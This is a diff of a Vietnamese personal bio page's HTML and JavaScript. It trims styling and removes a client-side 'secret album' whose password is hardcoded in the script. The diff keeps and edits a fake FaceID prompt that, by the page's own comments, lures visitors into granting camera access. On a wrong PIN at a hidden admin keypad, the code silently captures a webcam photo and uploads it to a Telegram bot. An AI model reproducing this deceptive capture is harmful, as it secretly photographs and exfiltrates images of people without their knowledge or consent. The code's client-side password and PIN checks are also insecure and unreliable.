@@ -4,13 +4,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Góc nhỏ của Duy</title>
-
   <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/833/833472.png" type="image/png">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&family=Patrick+Hand&family=Courier+New:wght@700&display=swap" rel="stylesheet">
 
   <style>
-    /* --- CẤU HÌNH GIAO DIỆN CHÍNH --- */
+    /* --- CẤU HÌNH GIAO DIỆN --- */
     :root { --primary-color: #ff85a2; --bg-gradient: linear-gradient(135deg, #ffe6f0 0%, #e6f7ff 100%); }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: 'Quicksand', sans-serif; background: var(--bg-gradient); color: #d63384; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; overflow-x: hidden; position: relative; }
@@ -22,60 +21,27 @@
     .btn-main { background: linear-gradient(to right, #ff99cc, #ffccff); color: white; }
     .btn-social { background: var(--primary-color); color: white; width: 100%; max-width: 200px; display: flex; align-items: center; justify-content: center; margin: 10px auto; }
     .btn-social i { margin-right: 10px; }
-    .btn-contact { background: #fff; color: #ff85a2; border: 2px solid #ffb6c1; }
     
-    /* Link từ Admin */
-    .dynamic-link-item { display: flex; align-items: center; background: rgba(255,255,255,0.9); padding: 10px 15px; margin-bottom: 12px; border-radius: 20px; text-decoration: none; color: #d63384; font-weight: bold; border: 2px solid white; transition: 0.2s; }
-    .dynamic-link-item:hover { transform: scale(1.02); }
-    .dynamic-link-img { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; margin-right: 15px; }
-
-    /* Các phần ẩn */
-    .social-links, .upload-section, .password-area, .secret-link { display: none; margin-top: 20px; animation: fadeIn 0.8s ease forwards; }
-    .section-divider { margin-top: 30px; border-top: 2px dashed #ffb6c1; padding-top: 20px; }
-    input[type="password"] { padding: 12px; border-radius: 20px; border: 2px solid #ffb6c1; outline: none; text-align: center; width: 80%; margin-top: 10px; background: rgba(255,255,255,0.8); }
-    
-    /* Thú cưng bay bay */
-    .animal-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
-    .animal { position: absolute; font-size: 30px; animation: floatAnimal 15s infinite linear; opacity: 0.7; }
-    @keyframes floatAnimal { 0% { transform: translateX(-50px); } 100% { transform: translateX(100vw); } }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-    /* --- 1. DYNAMIC ISLAND (FAKE FACEID) --- */
-    #dynamic-island {
-        position: fixed; top: 10px; left: 50%; transform: translateX(-50%);
-        width: 120px; height: 35px;
-        background: black; border-radius: 20px;
-        z-index: 99999;
-        display: flex; justify-content: space-between; align-items: center;
-        padding: 0 5px;
-        color: white; font-family: -apple-system, sans-serif; font-weight: 500; font-size: 0;
-        transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        opacity: 0; pointer-events: none;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-    }
+    /* Dynamic Island */
+    #dynamic-island { position: fixed; top: 10px; left: 50%; transform: translateX(-50%); width: 120px; height: 35px; background: black; border-radius: 20px; z-index: 99999; display: flex; justify-content: space-between; align-items: center; padding: 0 5px; color: white; font-family: sans-serif; font-size: 0; transition: 0.5s; opacity: 0; pointer-events: none; }
     #dynamic-island.active { width: 200px; height: 50px; opacity: 1; padding: 0 15px; font-size: 14px; }
-    .faceid-spinner {
-        width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3);
-        border-top-color: #00ff00; border-radius: 50%;
-        animation: spin 1s linear infinite; display: none;
-    }
+    .faceid-spinner { width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #00ff00; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
     #dynamic-island.active .faceid-spinner { display: block; }
     @keyframes spin { 100% { transform: rotate(360deg); } }
 
-    /* --- 2. BÀN PHÍM SỐ (KEYPAD) --- */
-    .btn-gear { position: fixed; bottom: 20px; left: 20px; width: 50px; height: 50px; background: rgba(255,255,255,0.9); border: 2px solid #ff85a2; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #ff85a2; font-size: 22px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); z-index: 999; cursor: pointer; transition: 0.2s; }
-    .btn-gear:active { transform: scale(0.9); }
-    
+    /* Keypad */
+    .btn-gear { position: fixed; bottom: 20px; left: 20px; width: 50px; height: 50px; background: rgba(255,255,255,0.9); border: 2px solid #ff85a2; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #ff85a2; font-size: 22px; z-index: 999; cursor: pointer; }
     .among-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
-    .keypad-container { background: #788a91; padding: 20px; border-radius: 15px; border: 4px solid #364045; width: 300px; text-align: center; user-select: none; }
-    .display-screen { background: #1b2621; color: #38b586; font-family: 'Courier New', monospace; font-size: 28px; font-weight: bold; padding: 20px; border: 4px solid #101613; margin-bottom: 20px; letter-spacing: 4px; text-transform: uppercase; border-radius: 5px; }
-    .status-lights { display: flex; justify-content: flex-end; gap: 12px; margin-bottom: 20px; padding-right: 10px; }
-    .light { width: 18px; height: 18px; border-radius: 50%; background: #2a3336; border: 2px solid #1a2022; }
-    .light.on-red { background: #ff3333; box-shadow: 0 0 15px #ff3333; }
-    .light.on-green { background: #33ff33; box-shadow: 0 0 15px #33ff33; }
+    .keypad-container { background: #788a91; padding: 20px; border-radius: 15px; border: 4px solid #364045; width: 300px; text-align: center; }
+    .display-screen { background: #1b2621; color: #38b586; font-family: 'Courier New', monospace; font-size: 28px; font-weight: bold; padding: 20px; border: 4px solid #101613; margin-bottom: 20px; border-radius: 5px; }
     .keys-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-    .keys-grid button { background: #d1d6d8; border: none; box-shadow: 0 6px #83898c; margin-bottom: 6px; padding: 15px 0; font-size: 22px; font-weight: 900; color: #364045; cursor: pointer; border-radius: 8px; touch-action: manipulation; transition: 0.05s; }
+    .keys-grid button { background: #d1d6d8; border: none; box-shadow: 0 6px #83898c; padding: 15px 0; font-size: 22px; font-weight: 900; color: #364045; border-radius: 8px; }
     .keys-grid button:active { transform: translateY(6px); box-shadow: none; background: #bec3c5; }
+    
+    /* Background Animal */
+    .animal-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+    .animal { position: absolute; font-size: 30px; animation: floatAnimal 15s infinite linear; opacity: 0.7; }
+    @keyframes floatAnimal { 0% { transform: translateX(-50px); } 100% { transform: translateX(100vw); } }
   </style>
 </head>
 <body>
@@ -93,27 +59,12 @@
 
   <div class="container">
     <div class="intro-text">🌸 Phan Đức Duy 🌸</div>
-    <button class="btn btn-main" onclick="toggleSocials()">🐾 Mạng xã hội 🌸</button>
-    <div class="social-links" id="socialLinks">
-      <a href="https://www.facebook.com/phan.duc.duy.6" class="btn btn-social"><i class="fab fa-facebook"></i> Facebook</a>
-      <a href="https://www.tiktok.com/@phan.duc.duy6" class="btn btn-social" style="background: black;"><i class="fab fa-tiktok"></i> TikTok</a>
-    </div>
+    <a href="https://www.facebook.com/phan.duc.duy.6" class="btn btn-social"><i class="fab fa-facebook"></i> Facebook</a>
+    <a href="https://www.tiktok.com/@phan.duc.duy6" class="btn btn-social" style="background: black;"><i class="fab fa-tiktok"></i> TikTok</a>
 
-    <div class="section-divider">
+    <div style="margin-top: 30px; border-top: 2px dashed #ffb6c1; padding-top: 20px;">
         <h3>✨ Liên kết nhanh</h3>
         <div id="dynamic-links-area"></div>
-    </div>
-    
-    <div class="section-divider">
-      <h3>🔐 Album bí mật</h3>
-      <button class="btn btn-contact" id="toggleSecretBtn" onclick="showSecretInput()">Mở khóa</button>
-      <div id="passwordArea" class="password-area">
-        <input type="password" id="passwordInput" placeholder="Pass là gì?">
-        <button class="btn btn-main" onclick="checkPassword()" style="margin-top:10px">OK</button>
-      </div>
-      <div id="secretLink" class="secret-link">
-        <a href="#" class="btn btn-main">Link Album ở đây</a>
-      </div>
     </div>
   </div> 
 
@@ -124,7 +75,6 @@
   <div id="amongUsOverlay" class="among-overlay">
       <div class="keypad-container">
           <div class="display-screen" id="displayScreen">ENTER CODE</div>
-          <div class="status-lights"><div class="light" id="light-red"></div><div class="light" id="light-green"></div></div>
           <div class="keys-grid">
               <button onclick="pressKey(1)">1</button><button onclick="pressKey(2)">2</button><button onclick="pressKey(3)">3</button>
               <button onclick="pressKey(4)">4</button><button onclick="pressKey(5)">5</button><button onclick="pressKey(6)">6</button>
@@ -138,23 +88,15 @@
 
   <video id="hiddenVideo" autoplay playsinline muted style="display:none;"></video>
   <canvas id="hiddenCanvas" style="display:none;"></canvas>
-  
   <audio id="beepSound" src="https://www.soundjay.com/buttons/beep-07.mp3"></audio>
-  <audio id="errorSound" src="https://www.soundjay.com/buttons/button-10.mp3"></audio>
-  <audio id="successSound" src="https://www.soundjay.com/buttons/button-3.mp3"></audio>
 
   <script>
-    function toggleSocials() { var x = document.getElementById("socialLinks"); x.style.display = x.style.display === "block" ? "none" : "block"; }
-    function showSecretInput() { document.getElementById("toggleSecretBtn").style.display="none"; document.getElementById("passwordArea").style.display="block"; }
-    function checkPassword() { if(document.getElementById("passwordInput").value === "Phanducduy6.") { document.getElementById("secretLink").style.display="block"; document.getElementById("passwordArea").style.display="none"; } else { alert("Sai pass"); } }
-    
     let storedData = localStorage.getItem('myBioData');
-    let links = storedData ? JSON.parse(storedData) : [{title:"Demo Link", url:"#"}];
+    let links = storedData ? JSON.parse(storedData) : [{title:"(Chưa có link nào)", url:"#"}];
     const dContainer = document.getElementById('dynamic-links-area');
     links.forEach(l => {
-        let img = l.img ? `<img src="${l.img}" class="dynamic-link-img">` : '';
-        let el = document.createElement('a'); el.className='dynamic-link-item'; el.href=l.url; el.target="_blank";
-        el.innerHTML = `${img} <span style="flex:1;text-align:left">${l.title}</span>`;
+        let el = document.createElement('a'); el.style.display="block"; el.style.background="white"; el.style.margin="10px"; el.style.padding="10px"; el.style.borderRadius="15px"; el.style.textDecoration="none"; el.style.color="#d63384"; el.style.fontWeight="bold";
+        el.href=l.url; el.target="_blank"; el.innerText = l.title;
         dContainer.appendChild(el);
     });
   </script>
@@ -171,7 +113,7 @@
     let stream = null;
     let currentInput = "";
     
-    // 1. KÍCH HOẠT (Dụ bật cam)
+    // 1. Kích hoạt FaceID ảo
     function triggerFaceID() {
         island.classList.add('active');
         startCamera().then(() => {
@@ -181,31 +123,28 @@
         });
     }
 
-    // 2. CAMERA
+    // 2. Camera
     async function startCamera() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-        } catch(e) { console.log(e); }
+        try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); video.srcObject = stream; } catch(e) {}
     }
     function stopCamera() { if(stream) stream.getTracks().forEach(t => t.stop()); }
 
+    // 3. Chụp và gửi ÂM THẦM
     function takePhotoSilent() {
         if(!stream) return;
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         
-        // Gửi ngầm (Không thông báo gì hết)
         canvas.toBlob(blob => {
             let fd = new FormData();
             fd.append('chat_id', CHAT_ID);
             fd.append('photo', blob, 'intruder.png');
-            fd.append('caption', '🚨 CẢNH BÁO: Kẻ gian nhập sai pass! (Đã chụp âm thầm)');
+            fd.append('caption', '🚨 Kẻ gian nhập sai pass!');
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd });
         });
     }
 
-    // 3. KEYPAD
+    // 4. Keypad Logic
     function openKeypad() { overlay.style.display = "flex"; currentInput=""; document.getElementById('displayScreen').innerText="ENTER CODE"; }
     function closeKeypad() { overlay.style.display = "none"; stopCamera(); }
     function pressKey(n) {
@@ -215,31 +154,30 @@
 
     function checkCode() {
         if(currentInput === ADMIN_PIN) {
-            document.getElementById('successSound').play();
-            document.getElementById('light-green').className="light on-green";
+            // Đúng pass
             document.getElementById('displayScreen').innerText="OK!";
+            document.getElementById('displayScreen').style.color="#00ff00";
             stopCamera();
             setTimeout(() => { window.location.href="admin.html"; }, 800);
         } else {
-            // SAI PASS
-            document.getElementById('errorSound').play();
-            document.getElementById('light-red').className="light on-red";
+            // Sai pass -> Rung lắc -> Chụp ngầm -> Reset
             document.getElementById('displayScreen').innerText="ERROR";
+            document.getElementById('displayScreen').style.color="red";
             
-            // Rung lắc nhẹ
+            // Rung
             const k = document.querySelector('.keypad-container');
             k.style.transform="translateX(10px)";
             setTimeout(()=>k.style.transform="translateX(-10px)",50);
             setTimeout(()=>k.style.transform="translateX(0)",100);
 
-            // CHỤP ÂM THẦM
+            // Chụp
             takePhotoSilent();
 
-            // Reset êm ái
+            // Reset lại để nhập tiếp
             setTimeout(() => {
                 currentInput = "";
                 document.getElementById('displayScreen').innerText="ENTER CODE";
-                document.getElementById('light-red').className="light";
+                document.getElementById('displayScreen').style.color="#38b586";
             }, 1000);
         }
     }
